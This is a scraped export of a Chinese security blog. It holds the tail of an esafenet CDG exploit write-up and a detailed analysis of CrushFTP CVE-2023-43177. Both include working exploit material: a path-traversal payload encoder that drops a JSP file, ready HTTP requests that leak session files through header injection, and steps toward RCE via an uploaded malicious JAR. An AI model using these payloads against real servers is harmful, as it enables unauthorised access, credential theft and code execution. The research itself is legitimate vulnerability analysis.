&lt; var7 / 2; var8[var10001] ^= var8[var10++]) &#123; var10001 = var9++; &#125; var12 = var8[var7 / 2 - 1]; var8[var7 / 2] ^= S[var12 &amp; 255] &amp; 255 ^ (S[var12 &gt;&gt;&gt; 8 &amp; 255] &amp; 255) &lt;&lt; 8 ^ (S[var12 &gt;&gt;&gt; 16 &amp; 255] &amp; 255) &lt;&lt; 16 ^ (S[var12 &gt;&gt;&gt; 24 &amp; 255] &amp; 255) &lt;&lt; 24; var10 = var7 / 2; for(var9 = var10 + 1; var9 &lt; var7; var8[var10001] ^= var8[var10++]) &#123; var10001 = var9++; &#125; &#125; for(var10 = 0; var10 &lt; var7 &amp;&amp; var11 &lt; var6; ++var11) &#123; var4[var11 / var3][var11 % var3] = var8[var10]; var5[var2 - var11 / var3][var11 % var3] = var8[var10]; ++var10; &#125; &#125; for(int var14 = 1; var14 &lt; var2; ++var14) &#123; for(var10 = 0; var10 &lt; var3; ++var10) &#123; var12 = var5[var14][var10]; var5[var14][var10] = U1[var12 &gt;&gt;&gt; 24 &amp; 255] ^ U2[var12 &gt;&gt;&gt; 16 &amp; 255] ^ U3[var12 &gt;&gt;&gt; 8 &amp; 255] ^ U4[var12 &amp; 255]; &#125; &#125; Object[] var15 = new Object[]&#123;var4, var5&#125;; return var15; &#125; &#125; public static int getRounds(int var0, int var1) &#123; switch (var0) &#123; case 16: if (var1 == 16) &#123; return 10; &#125; else &#123; if (var1 == 24) &#123; return 12; &#125; return 14; &#125; case 24: if (var1 != 32) &#123; return 12; &#125; return 14; default: return 14; &#125; &#125; public static String getTransferUnEncrptString(String s) throws Exception &#123; byte[] abyte0 = s.getBytes(&quot;ISO8859_1&quot;); int nlength = Array.getLength(abyte0); int len = 2; byte[] result = new byte[nlength / len]; for (int i = 0; i &lt; nlength; i += len) &#123; byte bSingleCharUpper; byte byteRLower = abyte0[i]; byte byteLLower = abyte0[i + 1]; byteRLower = (byte)(byteRLower &amp; remain_low); byteRLower = (byte)(byteRLower &lt;&lt; 4); byteRLower = (byte)(byteRLower &amp; remain_up); byteLLower = (byte)(byteLLower &amp; remain_low); result[i / 2] = bSingleCharUpper = (byteLLower = (byte)(byteLLower | byteRLower)); &#125; String unencrptString = new String(result, &quot;ISO8859_1&quot;); return unencrptString; &#125; public static String getTransferEncrptString(String s) throws Exception &#123; byte[] byteTransferEncrpt = s.getBytes(&quot;ISO8859_1&quot;); int nLength = Array.getLength(byteTransferEncrpt); byte[] result = new byte[nLength * 2]; for (int i = 0; i &lt; nLength; ++i) &#123; int c; int sc = c = byteTransferEncrpt[i]; byte bUpper = (byte)(sc &gt;&gt;&gt;= 4); int bLower = c; byte bLowerChar = (byte)(bUpper &amp; remain_low); byte zero = 0; bLowerChar = bLowerChar == zero ? (byte)(bLowerChar | upper_bit_add_0101) : (byte)(bLowerChar | upper_bit_add_0100); byte cLowerChar = bLowerChar; byte bLowerChar1 = (byte)(bLower &amp; remain_low); bLowerChar1 = bLowerChar1 == zero ? (byte)(bLowerChar1 | upper_bit_add_0101) : (byte)(bLowerChar1 | upper_bit_add_0100); byte cLowerChar1 = bLowerChar1; result[i * 2] = cLowerChar; result[i * 2 + 1] = cLowerChar1; &#125; String encrptString = new String(result, &quot;ISO8859_1&quot;); return encrptString; &#125; public static String encode(String str) throws Exception &#123; byte[] abyte1 = str.getBytes(); int nLength = Array.getLength(abyte1); encode((byte[])abyte1, (int)nLength, (byte[])key2); String src = new String(abyte1, &quot;ISO8859_1&quot;); return getTransferEncrptString((String)src); &#125; public static void encode(byte[] abyte1, int nLength, byte[] abyte0) throws Exception &#123; int groupsLen = 16 * (nLength / 16); Object obj = makeKey((byte[])abyte0); encrypt((byte[])abyte1, (byte[])abyte1, (int)groupsLen, (Object)obj); if (groupsLen != nLength) &#123; int nLeft = nLength - groupsLen; for (int i = 0; i &lt; nLeft; ++i) &#123; int n = groupsLen + i; abyte1[n] = (byte)(abyte1[n] ^ i); &#125; &#125; &#125; public static String decode(String info) &#123; try &#123; info = getTransferUnEncrptString((String)info); byte[] abyte2 = info.getBytes(&quot;ISO8859_1&quot;); int nLength = Array.getLength(abyte2); decode((byte[])abyte2, (int)nLength, (byte[])key2); info = new String(abyte2); return info; &#125; catch (Exception ex) &#123; return info; &#125; &#125; public static void decode(byte[] abyte1, int nLength, byte[] abyte0) throws Exception &#123; int groupsLen = 16 * (nLength / 16); Object obj = makeKey((byte[])abyte0); decrypt((byte[])abyte1, (byte[])abyte1, (int)groupsLen, (Object)obj); if (groupsLen != nLength) &#123; int nLeft = nLength - groupsLen; for (int i = 0; i &lt; nLeft; ++i) &#123; int n = groupsLen + i; abyte1[n] = (byte)(abyte1[n] ^ i); &#125; &#125; &#125; public static void encrypt(byte[] in, byte[] result, int n, Object obj) throws Exception &#123; byte[] abyte = new byte[16]; byte[] abyte0 = new byte[16]; if (0 == n) &#123; return; &#125; for (int i = 0; i &lt; n / 16; ++i) &#123; System.arraycopy(in, i * 16, abyte, 0, 16); abyte0 = blockEncrypt((byte[])abyte, (int)0, (Object)obj); System.arraycopy(abyte0, 0, result, i * 16, 16); &#125; &#125; public static void decrypt(byte[] in, byte[] result, int n, Object obj) throws Exception &#123; byte[] abyte = new byte[16]; byte[] abyte0 = new byte[16]; if (0 == n) &#123; return; &#125; for (int i = 0; i &lt; n / 16; ++i) &#123; System.arraycopy(in, i * 16, abyte, 0, 16); abyte0 = blockDecrypt((byte[])abyte, (int)0, (Object)obj); System.arraycopy(abyte0, 0, result, i * 16, 16); &#125; &#125; public static void main(String[] args) throws Exception&#123; System.out.println(encode(&quot;&#123;\\&quot;totalSize\\&quot;:196,\\&quot;offset\\&quot;:\\&quot;0\\&quot;,\\&quot;loginName\\&quot;:\\&quot;y4loveyou\\&quot;,\\&quot;filePath\\&quot;:\\&quot;./../../../../../../../../esafenet/CdgWeb/CDGServer3/3g/y4test.jsp\\&quot;,\\&quot;userName\\&quot;:\\&quot;admin\\&quot;,\\&quot;pwd\\&quot;:\\&quot;admin@123\\&quot;,\\&quot;type\\&quot;:\\&quot;1\\&quot;,\\&quot;timestamp\\&quot;:1702496085&#125;&quot;)); &#125;&#125; 后话看都看了不如多看一点，对于MogDbController,虽然路由下很多执行命令的功能点 但是仔细看执行的地方，因为Java命令执行参数化的原因，这里没办法注入其他命令，可惜了这里该是有回显的 但是看另一个路由com.esafenet.fileserver.controller.DataBaseController#backrestore 看到Bash -c以及cmd /c也就放心了，同时如果不出网我们也可以把结果写到CDGServer3下直接访问即可，也或者写个马到CDGServer3下，方法比较多就不说了","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"代码审计","slug":"代码审计","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)","slug":"year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177","date":"2023-12-10T13:04:09.000Z","updated":"2024-08-04T09:01:49.794Z","comments":true,"path":"2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/","link":"","permalink":"https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/","excerpt":"","text":"CrushFTP Unauthenticated Remote Code Execution路由分析不像传统套件，这里自己实现了协议的解析并做调用，写法比较死板，不够灵活，在crushftp.server.ServerSessionHTTP可以看到具体的处理过程，代码”依托答辩”，不过漏洞思路值得学习 前台权限绕过简单来说，原理是因为程序实现存在匿名访问机制，并且可以通过header污染当前会话的参数导致产生了一些意外的操作 在crushftp.server.ServerSessionAJAX#buildPostItem当中，可以看到会解析每一个header，并将解析到的key,val保存到as2Info这个Properties中，同时这里对put的参数没有任何限制 1234567891011121314151617public boolean buildPostItem(Properties request, long http_len_max, Vector headers, String req_id) throws Exception &#123; Properties as2Info = new Properties(); boolean write100Continue = false; int x = 1;s while (x &lt; headers.size()) &#123; String data; String key = data = headers.elementAt(x).toString(); String val = &quot;&quot;; try &#123; val = data.substring(data.indexOf(&quot;:&quot;) + 1).trim(); key = data.substring(0, data.indexOf(&quot;:&quot;)).trim().toLowerCase(); &#125; catch (Exception e) &#123; Log.log(&quot;HTTP_SERVER&quot;, 3, e); &#125; as2Info.put(key, val); ......省略..... 我们顺便看看新版本是如何解决这一点的，从processAs2HeaderLine可以看出，允许设置到as2Info当中值受到了限制 12345678910111213141516public static void processAs2HeaderLine(String key, String val, String data, Properties as2Info) &#123; as2Info.put(key.trim().toLowerCase(), val.trim()); if (data.toLowerCase().startsWith(&quot;message-id:&quot;)) &#123; String as2Filename = data.substring(data.indexOf(&quot;:&quot;) + 1).trim(); if ((as2Filename = as2Filename.substring(1)).indexOf(&quot;@&quot;) &gt;= 0) &#123; as2Filename = as2Filename.substring(0, as2Filename.indexOf(&quot;@&quot;)); &#125; as2Filename = Common.replace_str(as2Filename, &quot;&lt;&quot;, &quot;&quot;); as2Filename = Common.replace_str(as2Filename, &quot;&gt;&quot;, &quot;&quot;); as2Info.put(&quot;as2Filename&quot;, as2Filename); &#125; else if (data.toLowerCase().startsWith(&quot;content-type:&quot;)) &#123; as2Info.put(&quot;contentType&quot;, data.substring(data.indexOf(&quot;:&quot;) + 1).trim()); &#125; else if (data.toLowerCase().startsWith(&quot;disposition-notification-options:&quot;)) &#123; as2Info.put(&quot;signMdn&quot;, String.valueOf(data.substring(data.indexOf(&quot;:&quot;) + 1).trim().indexOf(&quot;pkcs7-signature&quot;) &gt;= 0)); &#125; &#125; 继续往下接下来我们可以看到，在光标处没有做任何的限制，直接将as2Info中的每个键值对添加到了当前会话的user_info属性，因此这里存在一个属性覆盖的问题，接下来我们就需要看看覆盖哪些属性可能存在威胁 关于user_info属性的获取是通过一个封装好的函数来做获取 123456public String uiSG(String data) &#123; if (this.user_info.containsKey(data)) &#123; return this.user_info.getProperty(data); &#125; return &quot;&quot;;&#125; 同时在此基础上还有一系列类型转换的封装 12345678910111213141516171819202122public int uiIG(String data) &#123; try &#123; return Integer.parseInt(this.uiSG(data)); &#125; catch (Exception exception) &#123; return 0; &#125;&#125;public long uiLG(String data) &#123; try &#123; return Long.parseLong(this.uiSG(data)); &#125; catch (Exception exception) &#123; return 0L; &#125;&#125;public boolean uiBG(String data) &#123; return this.uiSG(data).toLowerCase().equals(&quot;true&quot;);&#125;...... 接下来就是寻找污染哪些属性可能造成危害，这里漏洞发现者使用了getUserName 其中csrf默认为true，我们需要传入c2f参数 123456789101112131415161718192021222324public boolean getUserName(Properties request) throws Exception &#123; if (request.getProperty(&quot;command&quot;, &quot;&quot;).equalsIgnoreCase(&quot;getUserName&quot;)) &#123; String response = &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;UTF-8\\&quot;?&gt; \\r\\n&quot;; if (ServerStatus.BG(&quot;csrf&quot;) &amp;&amp; !request.getProperty(&quot;c2f&quot;, &quot;&quot;).equals(&quot;&quot;)) &#123; String session_id = this.thisSessionHTTP.thisSession.getId(); try &#123; if (!request.getProperty(&quot;c2f&quot;, &quot;&quot;).equalsIgnoreCase(session_id.substring(session_id.length() - 4))) &#123; this.thisSessionHTTP.thisSession.uiVG(&quot;failed_commands&quot;).addElement(&quot;&quot; + new Date().getTime()); response = String.valueOf(response) + &quot;&lt;commandResult&gt;&lt;response&gt;FAILURE:Access Denied. (c2f)&lt;/response&gt;&lt;/commandResult&gt;&quot;; return this.writeResponse(response); &#125; &#125; catch (Exception e) &#123; Log.log(&quot;HTTP_SERVER&quot;, 2, e); this.thisSessionHTTP.thisSession.uiVG(&quot;failed_commands&quot;).addElement(&quot;&quot; + new Date().getTime()); response = String.valueOf(response) + &quot;&lt;loginResult&gt;&lt;response&gt;failure&lt;/response&gt;&lt;/loginResult&gt;&quot;; return this.writeResponse(response); &#125; &#125; response = this.thisSessionHTTP.thisSession.uiBG(&quot;user_logged_in&quot;) &amp;&amp; !this.thisSessionHTTP.thisSession.uiSG(&quot;user_name&quot;).equals(&quot;&quot;) ? String.valueOf(response) + &quot;&lt;loginResult&gt;&lt;response&gt;success&lt;/response&gt;&lt;username&gt;&quot; + this.thisSessionHTTP.thisSession.uiSG(&quot;user_name&quot;) + &quot;&lt;/username&gt;&lt;/loginResult&gt;&quot; : String.valueOf(response) + &quot;&lt;loginResult&gt;&lt;response&gt;failure&lt;/response&gt;&lt;/loginResult&gt;&quot;; return this.writeResponse(response); &#125; return false;&#125; 如果相等则返回登录成功，同时值得注意的是这里会返回user_name，因此我们可以利用这一点来判断漏洞是否可利用，如果是漏洞版本user_name就可以通过header覆盖，返回也可以是任意可控字符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980public boolean writeResponse(String response) throws Exception &#123; return this.writeResponse(response, true, 200, true, false, true);&#125;public boolean writeResponse(String response, boolean json) throws Exception &#123; return this.writeResponse(response, true, 200, true, json, true);&#125;public boolean writeResponse(String response, boolean log, int code, boolean convertVars, boolean json, boolean log_header) throws Exception &#123; boolean acceptsGZIP = false; return this.writeResponse(response, log, code, convertVars, json, acceptsGZIP, log_header);&#125;public boolean writeResponse(String response, boolean log, int code, boolean convertVars, boolean json, boolean acceptsGZIP, boolean log_header) throws Exception &#123; if (convertVars) &#123; response = ServerStatus.thisObj.change_vars_to_values(response, this.thisSessionHTTP.thisSession); &#125; this.write_command_http(&quot;HTTP/1.1 &quot; + code + &quot; OK&quot;, log_header); this.write_command_http(&quot;Cache-Control: no-store&quot;, log_header); this.write_command_http(&quot;Pragma: no-cache&quot;, log_header); if (json) &#123; this.write_command_http(&quot;Content-Type: application/jsonrequest;charset=utf-8&quot;); &#125; else &#123; this.write_command_http(&quot;Content-Type: text/&quot; + (response.indexOf(&quot;&lt;?xml&quot;) &gt;= 0 ? &quot;xml&quot; : &quot;plain&quot;) + &quot;;charset=utf-8&quot;); &#125; if (acceptsGZIP) &#123; this.thisSessionHTTP.write_command_http(&quot;Vary: Accept-Encoding&quot;); this.thisSessionHTTP.write_command_http(&quot;Content-Encoding: gzip&quot;); this.thisSessionHTTP.write_command_http(&quot;Transfer-Encoding: chunked&quot;); this.thisSessionHTTP.write_command_http(&quot;Date: &quot; + this.thisSessionHTTP.sdf_rfc1123.format(new Date()), log, true); this.thisSessionHTTP.write_command_http(&quot;Server: &quot; + ServerStatus.SG(&quot;http_server_header&quot;), log, true); this.thisSessionHTTP.write_command_http(&quot;P3P: CP=\\&quot;IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\\&quot;&quot;, log, true); if (!ServerStatus.SG(&quot;Access-Control-Allow-Origin&quot;).equals(&quot;&quot;)) &#123; String origin = this.thisSessionHTTP.headerLookup.getProperty(&quot;ORIGIN&quot;, &quot;&quot;); int x = 0; while (x &lt; ServerStatus.SG(&quot;Access-Control-Allow-Origin&quot;).split(&quot;,&quot;).length) &#123; boolean ok = false; if (origin.equals(&quot;&quot;)) &#123; ok = true; &#125; else if (ServerStatus.SG(&quot;Access-Control-Allow-Origin&quot;).split(&quot;,&quot;)[x].toUpperCase().trim().equalsIgnoreCase(origin.toUpperCase().trim())) &#123; ok = true; &#125; if (ok) &#123; this.write_command_http(&quot;Access-Control-Allow-Origin: &quot; + ServerStatus.SG(&quot;Access-Control-Allow-Origin&quot;).split(&quot;,&quot;)[x].trim()); &#125; ++x; &#125; this.write_command_http(&quot;Access-Control-Allow-Headers: authorization,content-type&quot;); this.write_command_http(&quot;Access-Control-Allow-Credentials: true&quot;); this.write_command_http(&quot;Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,PROPFIND,DELETE,MKCOL,MOVE,COPY,HEAD,PROPPATCH,LOCK,UNLOCK,ACL,TR&quot;); &#125; this.write_command_http(&quot;&quot;, log); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = response.getBytes(&quot;UTF8&quot;); GZIPOutputStream out = new GZIPOutputStream(baos); ((OutputStream)out).write(b); out.finish(); if (baos.size() &gt; 0) &#123; this.thisSessionHTTP.original_os.write((String.valueOf(Long.toHexString(baos.size())) + &quot;\\r\\n&quot;).getBytes()); baos.writeTo(this.thisSessionHTTP.original_os); this.thisSessionHTTP.original_os.write(&quot;\\r\\n&quot;.getBytes()); baos.reset(); &#125; this.thisSessionHTTP.original_os.write(&quot;0\\r\\n\\r\\n&quot;.getBytes()); this.thisSessionHTTP.original_os.flush(); &#125; else &#123; this.thisSessionHTTP.write_standard_headers(log); int len = response.getBytes(&quot;UTF8&quot;).length + 2; if (len == 2) &#123; len = 0; &#125; this.write_command_http(&quot;Content-Length: &quot; + len, log_header); this.write_command_http(&quot;&quot;, log); if (len &gt; 0) &#123; this.thisSessionHTTP.write_command_http(response, log, convertVars); &#125; &#125; this.thisSessionHTTP.thisSession.drain_log(); return true;&#125; 当请求结束，在响应完成之后，在倒数第二行调用了drain_log方法，这个方法也很有意思 可以看到如果属性当中存在user_log_path_custom，并且不为空，接下来再结合覆盖其他参数 user_log_path_custom 中的值为new_loc user_log_path 中指定的值为old_loc 旧文件将复制到指定的新位置，并删除旧文件 现在我们可以做到任意文件复制以及删除，但经过测试我们会发现，如果我们读取一些敏感的配置文件到web路径下，访问后再移动回去会破坏掉文件本身的一些完整性 123456789101112131415161718192021222324252627282930313233343536public void drain_log() &#123;.....省略..... object = this.uiVG(&quot;user_log&quot;); synchronized (object) &#123; if (!this.uiSG(&quot;user_log_path_custom&quot;).equals(&quot;&quot;)) &#123; String new_loc = &quot;&quot; + this.user_info.remove(&quot;user_log_path_custom&quot;); String old_loc = this.uiSG(&quot;user_log_path&quot;); this.uiPUT(&quot;user_log_path&quot;, new_loc); new File_S(Common.all_but_last(String.valueOf(this.uiSG(&quot;user_log_path&quot;)) + this.uiSG(&quot;user_log_file&quot;))).mkdirs(); if (new File_S(String.valueOf(old_loc) + this.uiSG(&quot;user_log_file&quot;)).exists() &amp;&amp; !new File_S(String.valueOf(old_loc) + this.uiSG(&quot;user_log_file&quot;)).renameTo(new File_S(String.valueOf(new_loc) + this.uiSG(&quot;user_log_file&quot;)))) &#123; try &#123; Common.copy(String.valueOf(old_loc) + this.uiSG(&quot;user_log_file&quot;), String.valueOf(new_loc) + this.uiSG(&quot;user_log_file&quot;), true); &#125; catch (Exception exception) &#123; // empty catch block &#125; new File_S(String.valueOf(old_loc) + this.uiSG(&quot;user_log_file&quot;)).delete(); &#125; &#125; try &#123; com.crushftp.client.Common.copyStreams(new ByteArrayInputStream(sb.toString().getBytes(&quot;UTF8&quot;)), new FileOutputStream(new File_S(String.valueOf(this.uiSG(&quot;user_log_path&quot;)) + this.uiSG(&quot;user_log_file&quot;)), true), true, true); &#125; catch (FileNotFoundException e) &#123; try &#123; new File_S(Common.all_but_last(String.valueOf(this.uiSG(&quot;user_log_path&quot;)) + this.uiSG(&quot;user_log_file&quot;))).mkdirs(); com.crushftp.client.Common.copyStreams(new ByteArrayInputStream(sb.toString().getBytes(&quot;UTF8&quot;)), new FileOutputStream(new File_S(String.valueOf(this.uiSG(&quot;user_log_path&quot;)) + this.uiSG(&quot;user_log_file&quot;)), true), true, true); &#125; catch (IOException ee) &#123; Log.log(&quot;SERVER&quot;, 1, ee); &#125; &#125; catch (IOException e) &#123; Log.log(&quot;SERVER&quot;, 1, e); &#125; &#125;&#125; 毕竟是log功能，程序会将请求记录不断写入 而这部分功能则是受add_log控制，可以看到如果dont_log为true，那么就不会记录当前请求 12345678public void add_log(String log_data, String short_data, String check_data) &#123; if (this.uiBG(&quot;dont_log&quot;)) &#123; return; &#125; if (this.logDateFormat == null) &#123; this.logDateFormat = (SimpleDateFormat)ServerStatus.thisObj.logDateFormat.clone(); &#125;....... 因此我们不难构造出 12345678910111213POST /WebInterface/function/?command=getUsername&amp;c2f=a4Ga HTTP/1.1Host: 127.0.0.1:8080as2-to: Xuser_name: crushadminuser_log_file: file_to_readuser_log_path_custom: WebInterface/user_log_path: ./dont_log: trueContent-Length: 9Content-Type: application/x-www-form-urlencodedCookie: currentAuth=a4Ga; CrushAuth=1702222555460_GEeImKOtIut9bj65EsoOrsDUAYa4Ga;post=body 表面上看来到此漏洞可能已经利用结束了，但实际上还能再更进一步 但继续阅读源码我们会发现，程序在运行过程还会”定期”，将session当中的属性信息保存到sessions.obj文件当中 再来看看它是如何生成的,在crushftp.handlers.SharedSession#flush中如果属性allow_session_caching_memory为true才会执行，默认配置为true flush的调用在crushftp.handlers.SharedSession#shutdown 12345678910111213141516171819public static void shutdown() &#123; if (ServerStatus.BG(&quot;allow_session_caching_on_exit&quot;)) &#123; while (ServerStatus.siVG(&quot;user_list&quot;).size() &gt; 0) &#123; Properties user_info = (Properties)ServerStatus.siVG(&quot;user_list&quot;).elementAt(0); SessionCrush thisSession = (SessionCrush)user_info.get(&quot;session&quot;); if (thisSession != null) &#123; thisSession.do_kill(null); &#125; else &#123; ServerStatus.thisObj.remove_user(user_info); &#125; ServerStatus.siVG(&quot;user_list&quot;).remove(user_info); &#125; SharedSession recent_users = SharedSession.find(&quot;recent_user_list&quot;); recent_users.put(&quot;recent_user_list&quot;, ServerStatus.siVG(&quot;recent_user_list&quot;)); recent_users.put(&quot;user_login_num&quot;, ServerStatus.siSG(&quot;user_login_num&quot;)); &#125; shutting_down = true; SharedSession.flush();&#125; shutdown的调用在crushftp.handlers.ShutdownHandler#run，可以看到在构造函数当中，为通过Runtime.getRuntime().addShutdownHook(this)向JVM注册了一个关闭时的Hook动作 1234567891011121314151617181920212223242526272829303132333435363738394041public class ShutdownHandlerextends Thread &#123; boolean shutdown = false; public ShutdownHandler() &#123; Runtime.getRuntime().addShutdownHook(this); &#125; /* * Unable to fully structure code */ @Override public synchronized void run() &#123; block6: &#123; if (this.shutdown) break block6; AdminControls.stopLogins(new Properties(), &quot;CONNECT)&quot;); start = System.currentTimeMillis(); if (true) ** GOTO lbl13 do &#123; try &#123; Thread.sleep(1000L); &#125; catch (InterruptedException var3_2) &#123; // empty catch block &#125; if (ServerStatus.siVG(&quot;running_tasks&quot;).size() &lt;= 0) break; &#125; while (System.currentTimeMillis() - start &lt; ServerStatus.LG(&quot;active_jobs_shutdown_wait_secs&quot;) * 1000L); SharedSession.shutdown(); ServerStatus.thisObj.statTools.stopDB(); ServerStatus.thisObj.searchTools.stopDB(); &#125; this.shutdown = true; if (ServerStatus.thisObj.loggingProvider1 != null) &#123; ServerStatus.thisObj.loggingProvider1.flushNow(); &#125; if (ServerStatus.thisObj.loggingProvider2 != null) &#123; ServerStatus.thisObj.loggingProvider2.flushNow(); &#125; &#125;&#125; 因此保存的条件是重启过服务器…，这个文件的作用相当于是充当了服务器重启时的缓存，因此漏洞利用需要看运气了，这里为了重现漏洞我们重启一下系统生成这个文件 这里我们得到了完整的流程 12345678910111213POST /WebInterface/function/?command=getUsername&amp;c2f=a4Ga HTTP/1.1Host: 127.0.0.1:8080as2-to: Xuser_name: crushadminuser_log_file: sessions.objuser_log_path_custom: WebInterface/user_log_path: ./dont_log: trueContent-Length: 9Content-Type: application/x-www-form-urlencodedCookie: currentAuth=a4Ga; CrushAuth=1702222555460_GEeImKOtIut9bj65EsoOrsDUAYa4Ga;post=body 之后访问/WebInterface/sessions.obj/WebInterface/sessions.obj即可获取到泄漏的session信息 在这里我们还可以尝试权限维持，可以看到这里存在一个接口可以直接获取到明文密码 123456if (command.equalsIgnoreCase(&quot;getUser&quot;)) &#123; if (AdminControls.checkRole(command, site, this.thisSessionHTTP.thisSession.uiSG(&quot;user_ip&quot;))) &#123; return this.writeResponse(AdminControls.buildXML(AdminControls.getUser(request, site, this.thisSessionHTTP.thisSession), &quot;user_items&quot;, &quot;OK&quot;), true, 200, false, false, true); &#125; return this.writeResponse(&quot;&lt;commandResult&gt;&lt;response&gt;FAILURE:Access Denied.&lt;/response&gt;&lt;/commandResult&gt;&quot;);&#125; 在AdminControls.getUser当中，通过username查询到用户信息并返回 在这里比较骚的一点，系统会按照pass掉格式自适应解码，因此我们拿到的密码是明文~~~(Ps：就算不是也无所谓里面都是硬编码) 12345678910111213141516171819public static Object getUser(Properties request, String site, SessionCrush thisSession) &#123;......省略....... username = thisSession.uiSG(&quot;user_name&quot;);......省略....... VFS uVFS = UserTools.ut.getVFS(request.getProperty(&quot;serverGroup&quot;), username); Properties new_user = UserTools.ut.getUser(request.getProperty(&quot;serverGroup&quot;), username, false);......省略....... String pass = new_user.getProperty(&quot;password&quot;, &quot;&quot;); if (!(pass.startsWith(&quot;SHA:&quot;) || pass.startsWith(&quot;SHA512:&quot;) || pass.startsWith(&quot;SHA256:&quot;) || pass.startsWith(&quot;SHA3:&quot;) || pass.startsWith(&quot;MD5:&quot;) || pass.startsWith(&quot;CRYPT3:&quot;) || pass.startsWith(&quot;BCRYPT:&quot;) || pass.startsWith(&quot;MD5CRYPT:&quot;) || pass.startsWith(&quot;PBKDF2SHA256:&quot;) || pass.startsWith(&quot;SHA512CRYPT:&quot;) || pass.startsWith(&quot;ARGOND:&quot;))) &#123; pass = ServerStatus.thisObj.common_code.decode_pass(pass); new_user.put(&quot;password&quot;, pass); &#125; else &#123; new_user.put(&quot;password&quot;, &quot;SHA3:XXXXXXXXXXXXXXXXXXXX&quot;); &#125; if (!new_user.getProperty(&quot;userVersion&quot;, &quot;&quot;).equals(&quot;6&quot;) &amp;&amp; !new_user.getProperty(&quot;as2EncryptKeystorePassword&quot;, &quot;&quot;).equals(&quot;&quot;)) &#123; new_user.put(&quot;as2EncryptKeystorePassword&quot;, ServerStatus.thisObj.common_code.encode_pass(new_user.getProperty(&quot;as2EncryptKeystorePassword&quot;, &quot;&quot;), &quot;DES&quot;, &quot;&quot;)); new_user.put(&quot;as2EncryptKeyPassword&quot;, ServerStatus.thisObj.common_code.encode_pass(new_user.getProperty(&quot;as2EncryptKeyPassword&quot;, &quot;&quot;), &quot;DES&quot;, &quot;&quot;)); &#125;......省略....... 简单发包做个验证 后台代码执行在后台设置中，发现可以动态加载 SQL 驱动程序和配置测试，因此只需要能够上传恶意 JAR 文件即可实现RCE 毕竟是FTP一定存在上传的点，但是在上传后发现没有权限 经过查找我们可以发现在后台可以增加虚拟路径和物理路径的映射 顺便抓了个包 1command=setUserItem&amp;data_action=replace&amp;serverGroup=extra_vfs&amp;username=crushadmin~Y4Test&amp;user=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cuser+type%3D%22properties%22%3E%3Cusername%3Ecrushadmin~Y4Test%3C%2Fusername%3E%3Cpassword%3E%3C%2Fpassword%3E%3Cmax_logins%3E0%3C%2Fmax_logins%3E%3Croot_dir%3E%2F%3C%2Froot_dir%3E%3C%2Fuser%3E&amp;xmlItem=user&amp;vfs_items=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3Cvfs_items+type%3D%22vector%22%3E%0D%0A%3Cvfs_items_subitem+type%3D%22properties%22%3E%0D%0A%3Cname%3EY4TMP%3C%2Fname%3E%0D%0A%3Cpath%3E%2F%3C%2Fpath%3E%0D%0A%3Cvfs_item+type%3D%22vector%22%3E%0D%0A%3Cvfs_item_subitem+type%3D%22properties%22%3E%0D%0A%3Ctype%3EDIR%3C%2Ftype%3E%0D%0A%3Curl%3E%3C%2Furl%3E%0D%0A%3C%2Fvfs_item_subitem%3E%0D%0A%3C%2Fvfs_item%3E%0D%0A%3C%2Fvfs_items_subitem%3E%0D%0A%3Cvfs_items_subitem+type%3D%22properties%22%3E%0D%0A%3Cname%3Etmp%3C%2Fname%3E%0D%0A%3Cpath%3E%2FY4TMP%2F%3C%2Fpath%3E%0D%0A%3Cvfs_item+type%3D%22vector%22%3E%0D%0A%3Cvfs_item_subitem+type%3D%22properties%22%3E%0D%0A%3Ctype%3EDIR%3C%2Ftype%3E%0D%0A%3Curl%3EFILE%3A%2F%2FVolumes%2FMacintosh+HD%2Ftmp%2F%3C%2Furl%3E%0D%0A%3C%2Fvfs_item_subitem%3E%0D%0A%3C%2Fvfs_item%3E%0D%0A%3C%2Fvfs_items_subitem%3E%0D%0A%3C%2Fvfs_items%3E&amp;permissions=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3CVFS+type%3D%22properties%22%3E%0D%0A%3Citem+name%3D%22%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3Citem+name%3D%22%2FY4TMP%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3Citem+name%3D%22%2FY4TMP%2FTMP%2F%22%3E(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)%3C%2Fitem%3E%0D%0A%3C%2FVFS%3E&amp;c2f=kYjk 对应以下的参数，按照此模板做修改即可注意替换username(用户名~随意的自定义参数|参考上面的图上面的截图就很容易理解)、c2f参数即可 123456789101112131415161718192021222324252627282930313233343536command: setUserItemdata_action: replaceserverGroup: extra_vfsusername: crushadmin~Y4Testuser: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;user type=&quot;properties&quot;&gt;&lt;username&gt;crushadmin~Y4Test&lt;/username&gt;&lt;password&gt;&lt;/password&gt;&lt;max_logins&gt;0&lt;/max_logins&gt;&lt;root_dir&gt;/&lt;/root_dir&gt;&lt;/user&gt;xmlItem: uservfs_items: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;vfs_items type=&quot;vector&quot;&gt;&lt;vfs_items_subitem 